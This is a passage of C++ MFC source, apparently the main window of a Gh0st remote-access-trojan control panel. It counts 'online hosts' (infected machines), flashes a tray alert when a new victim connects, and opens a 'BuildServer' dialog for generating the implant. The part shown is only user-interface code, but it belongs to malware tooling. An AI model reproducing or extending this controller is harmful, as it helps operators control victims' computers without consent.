		a_chkm = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("设置", "Alarm", false);
	    if(a_chkm)
		    stro = "关闭语音提示";
	    else
		    stro = "开启语音提示";
		pPopup->ModifyMenu(1,MF_BYPOSITION | MF_STRING|MF_POPUP,IDM_VOICEPROMPT, stro);

		CPoint Point;
		GetCursorPos(&Point);
		pPopup->TrackPopupMenu(TPM_LEFTALIGN,
			Point.x,Point.y,AfxGetMainWnd(),NULL);
		AfxGetMainWnd()->PostMessage(WM_NULL,0,0);
	}
	return NULL;
}

void CMainFrame::OnUpdateStatusBar(CCmdUI *pCmdUI)
{
	// TODO: Add your message handler code here and/or call default
	pCmdUI->Enable();
}

void CMainFrame::ShowConnectionsNumber()
{
	CString str,strTemp;
	int a = 0;
	CPcView* pView = NULL;
	int count = g_pTabView->m_wndTabControl.GetItemCount();
	for (int i = 0; i < count; i++)
	{	
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
		a += pView->m_pListCtrl->GetItemCount();
	}
	str.Format("上线主机: %d", a);
	m_wndStatusBar.SetPaneText(3, str);
	Zjshulian=a;
}

void CMainFrame::OnShow() 
{
	// TODO: Add your command handler code here

	MinTray=NULL;  //桌面显示状态
	IOCTrat=NULL;  //关闭定时器 
	m_TrayIcon.RemoveIcon();
	m_TrayIcon.MaximizeFromTray(this);
}

void CMainFrame::OnExit() 
{
	// TODO: Add your command handler code here
	OnClose();
}

void CMainFrame::ShowToolTips(LPCTSTR lpszText)
{	
	m_TrayIcon.ShowBalloonTip( lpszText, _T(Bt_szName), NIIF_NONE, 5);
}

void CMainFrame::SetTheme(int iTheme)
{
	m_iTheme = iTheme;
	XTThemeManager()->SetTheme((XTThemeStyle)m_iTheme);
	XTPPaintManager()->SetTheme((XTPPaintTheme)m_iTheme);
	
	RedrawWindow( NULL, NULL, RDW_INVALIDATE | RDW_UPDATENOW | RDW_ERASE | RDW_ALLCHILDREN );
	
	RecalcLayout();
}


BOOL CMainFrame::OnEraseBkgnd(CDC* /*pDC*/) 
{
	// TODO: Add your message handler code here and/or call default
	return TRUE;
}

void CMainFrame::OnSettings() 
{
	// TODO: Add your command handler code here
	CSettingDlg dlg;
	dlg.DoModal();
}

void CMainFrame::OnBuild() 
{
	// TODO: Add your command handler code here
	BuildServer dlg;
	dlg.DoModal();
}

CXTPDockingPane* CMainFrame::CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat, XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour)
{
	int nID = ++m_nCount;
	
	CXTPDockingPane* pwndPane = m_paneManager.CreatePane(nID, CRect(0, 0,x, y), direction, pNeighbour);
	
	CString strTitle;
	strTitle.Format(strFormat, nID);
	pwndPane->SetTitle(strTitle);
	pwndPane->SetIconID(nID % 6 + 1);
	
	CFrameWnd* pFrame = new CFrameWnd;
	
	CCreateContext context;
	context.m_pNewViewClass = pNewViewClass;
	context.m_pCurrentDoc = GetActiveView()->GetDocument();
	
	pFrame->Create(NULL, NULL, WS_CHILD|WS_VISIBLE|WS_CLIPCHILDREN|WS_CLIPSIBLINGS, CRect(0, 0, 0, 0), this, NULL, 0, &context);
	pFrame->ModifyStyleEx(WS_EX_CLIENTEDGE, 0);
	
	m_mapPanes.SetAt(nID, pFrame);
	
	return pwndPane;
}

LRESULT CMainFrame::OnDockingPaneNotify(WPARAM wParam, LPARAM lParam)
{
	if (wParam == XTP_DPN_SHOWWINDOW)
	{
		// get a pointer to the docking pane being shown.
		CXTPDockingPane* pPane = (CXTPDockingPane*)lParam;
		if (!pPane->IsValid())
		{
			CWnd* pWnd = NULL;
			if (m_mapPanes.Lookup(pPane->GetID(), pWnd))
			{
				pPane->Attach(pWnd);
			}
		}
		
		return TRUE; // handled
	}

	return FALSE;
}

void CMainFrame::OnAppExit() 
{
	// TODO: Add your command handler code here
	OnClose();
}

void CMainFrame::OnCustomize()
{

}

void CMainFrame::OnUpdateOptionsStyle(CCmdUI* pCmdUI)
{
	pCmdUI->SetCheck(pCmdUI->m_nID == m_nRibbonStyle ? 1 : 0);

}

void CMainFrame::OnFrameTheme()
{
	ShowWindow(SW_NORMAL);
	CXTPRibbonBar* pRibbonBar = (CXTPRibbonBar*)GetCommandBars()->GetAt(0);

	CXTPWindowRect rc(this);
	rc.top += (pRibbonBar->IsFrameThemeEnabled() ? -1 : +1) * GetSystemMetrics(SM_CYCAPTION);
	MoveWindow(rc);
	
	pRibbonBar->EnableFrameTheme(!pRibbonBar->IsFrameThemeEnabled());

}

void CMainFrame::OnUpdateFrameTheme(CCmdUI* pCmdUI)
{
	CXTPRibbonBar* pRibbonBar = (CXTPRibbonBar*)GetCommandBars()->GetAt(0);

	pCmdUI->SetCheck(pRibbonBar->IsFrameThemeEnabled() ? TRUE : FALSE);
}

void CMainFrame::OnTools() 
{
	// TODO: Add your command handler code here
	CMyToolsKit dlg;
	dlg.DoModal();
}

void CMainFrame::OnAddSkin()// 加载资源皮肤
{
/*

	HGLOBAL hRes;
	HRSRC hResInfo;
	HINSTANCE hinst = AfxGetInstanceHandle();
	hResInfo = FindResource( hinst, MAKEINTRESOURCE(IDR_SKIN), "SKIN" );
	if (hResInfo != NULL)
	{
		hRes = LoadResource( hinst, hResInfo);
		if (hRes != NULL)
		{
			SkinH_Attach();
			SkinH_AttachRes( (LPBYTE)hRes, SizeofResource(hinst,hResInfo), NULL, NULL, NULL, NULL );
//			SkinH_AttachEx(("Control/SkinH.she"), NULL);
//			SkinH_SetAero(TRUE);
//			FreeResource(hRes);
//			SkinH_SetMenuAlpha(170);
//			SkinH_AdjustHSV(0,-100,0);
		}
	}*/


}

/*
void CMainFrame::OnAddSkin()// 加载资源皮肤
{
    static TCHAR szAppName[] = TEXT ("About1") ;
     MSG          msg ;
     HWND         hwnd ;
     WNDCLASS     wndclass ;
  
     wndclass.style         = CS_HREDRAW | CS_VREDRAW ;
     wndclass.lpfnWndProc   = WndProc ;
     wndclass.cbClsExtra    = 0 ;
     wndclass.cbWndExtra    = 0 ;
     wndclass.hInstance     = 0;//hInstance ;
     wndclass.hIcon         = 0;//LoadIcon (hInszAppName) ;
     wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW) ;
     wndclass.hbrBackground = (HBRUSH) GetStockObject (WHITE_BRUSH) ;
     wndclass.lpszMenuName  = szAppName ;
     wndclass.lpszClassName = szAppName ;
     
     if (!RegisterClass (&wndclass))
     {
          MessageBox (TEXT ("This program requires Windows NT!"),
                      szAppName, MB_ICONERROR) ;
          return ;
     }

     	SkinH_AttachEx(("skins/MSN.she"), NULL); 
     hwnd = CreateWindow (szAppName, TEXT ("About Box Demo Program"),
                          WS_OVERLAPPEDWINDOW,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          NULL, NULL, 0, NULL) ;
     
     ::ShowWindow (hwnd,SW_SHOW) ;
     ::UpdateWindow (hwnd) ; 

     while (GetMessage (&msg, NULL, 0, 0))
     {
          TranslateMessage (&msg) ;
          DispatchMessage (&msg) ;
     }

}
*/
CString ToolTipsTextsp;
void CMainFrame::OnTimerspop(BOOL Tstx,CString ToolTipsText)
{
	ToolTipsTextsp=ToolTipsText;
	if((MinTray==NULL)|(Tstx==TRUE))  //托盘图标
	{
		IOCTrat=NULL;
	}
	else  //托盘图标闪烁
	{
//		wsprintf(m_NotifyIcon.szTip,"上线主机-->\n%s\n当前主机数量: %d台",ToolTipsText,Zjshulian);   //
		IOCTrat=TRUE;
	}

	OnTimerschushi(); //刷新托盘数值显示
}

void CMainFrame::OnTimerschushi() //刷新托盘数值显示
{
	//初始化记录值
    m_nCurrent = 0;
	SetTimer(1, 500, NULL);  //开启图标闪烁定时器 1
}

void CMainFrame::OnTimer(UINT nIDEvent)
{
	// TODO: Add your message handler code here and/or call default
	if(nIDEvent == 1)
	{
		m_NotifyIcon.cbSize = sizeof(NOTIFYICONDATA);
		m_NotifyIcon.hWnd = this->GetSafeHwnd();
		m_NotifyIcon.uID = IDR_MAINFRAME;
		m_NotifyIcon.uFlags = NIF_ICON |NIF_TIP |NIF_MESSAGE;
		m_NotifyIcon.uCallbackMessage = WM_ICONMESSAGE;

		if(IOCTrat==TRUE)  //图标闪烁开启
		{
			wsprintf(m_NotifyIcon.szTip,"上线主机-->\n%s\n主机数量: %d台",ToolTipsTextsp,Zjshulian);   //
		    if(m_nCurrent == 0)
			{
			    m_NotifyIcon.hIcon = m_hEmptyIcon;
			    m_nCurrent = 1;
			}
		    else
			{
			    m_NotifyIcon.hIcon = m_hDrawIcon;
			    m_nCurrent = 0;
			}
		}
		else
		{
	        CString Lineips = Onlinetips();
	        CString Lineips1 = OnVoicepromptsm();
	        wsprintf(m_NotifyIcon.szTip,"主机数量: %d台\n语音: %s\n消息提示: %s",Zjshulian,Lineips1,Lineips);
			m_NotifyIcon.hIcon = m_hDrawIcon;
			KillTimer(1);  //关闭定时器 1
		}
		Shell_NotifyIcon(NIM_MODIFY,&m_NotifyIcon);
	}

	CXTPFrameWnd::OnTimer(nIDEvent);
}

void CMainFrame::OnNewstips() 
{
    BOOL Popt = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("设置", "PopTips", false);
	if(Popt)
		Popt = NULL;
	else
		Popt = TRUE;
    ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("设置", "poptips", Popt);

	g_pFrame->IOCTrat=NULL;
	g_pFrame->OnTimerschushi(); //刷新托盘数值显示
}

void CMainFrame::OnVoiceprompt() 
{
    BOOL Popt = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("设置", "Alarm", false);
	if(Popt)
		Popt = NULL;
	else
		Popt = TRUE;
    ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("设置", "Alarm", Popt);

	g_pFrame->IOCTrat=NULL;
	g_pFrame->OnTimerschushi(); //刷新托盘数值显示
	
}
